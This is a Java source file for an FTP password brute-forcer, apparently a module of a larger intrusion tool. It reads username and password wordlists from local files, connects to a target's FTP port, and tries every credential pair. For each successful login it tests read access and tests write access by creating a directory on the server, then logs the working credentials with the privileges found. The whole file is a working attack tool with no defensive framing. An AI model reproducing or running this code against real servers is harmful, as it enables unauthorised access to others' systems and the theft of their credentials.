package action.bruter;

import global.GlobalSetting;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketException;
import java.util.ArrayList;

import org.apache.commons.net.ftp.FTPClient;

import tools.Logger;

public class FtpBruter {
	public static final int DEFAULT_PORT = 21;
	private static ArrayList<String> userlist = new ArrayList<String>();
	private static ArrayList<String> passlist = new ArrayList<String>();
	private static FTPClient ftpClient = null;
	
	public void run(String target) {
		if (!getUserPass()) {
			Logger.getInstance().insertLog("Error", "FtpBruter getUserPass error!");
			return;
		}
		
		ftpClient = new FTPClient();
		ftpClient.setDefaultPort(DEFAULT_PORT);
		ftpClient.setConnectTimeout(GlobalSetting.timeout); 
		try {
			ftpClient.connect(target);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Logger.getInstance().insertLog("Error", target+":ftp connect timeout!");
			return;
		}
		
		for (int i=0; i<userlist.size(); i++)
			for (int j=0; j<passlist.size(); j++) 
				checkLogin(target, userlist.get(i), passlist.get(j));
	}
	
	private void checkLogin(String target, String username, String password) {
		try {
			String privilege = "";
			boolean ret = ftpClient.login(username, password);
			if (!ret)
				return;
			int code = 0;
			code = ftpClient.list();	//150 ok 550 deny
			if (code == 150)
				privilege += "R";
			code = ftpClient.mkd("fireXXX");
			if (code == 257)
				privilege += "W";
			
			Logger.getInstance().insertResult(target+":"+username+":"+password+":"+privilege);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			return;
		}
	}
	
	private boolean getUserPass() {
		if (userlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\ftp_user.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	userlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}	
		}
		
		if (passlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\ftp_pass.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	passlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}
		}
		
		return true;
	}
}
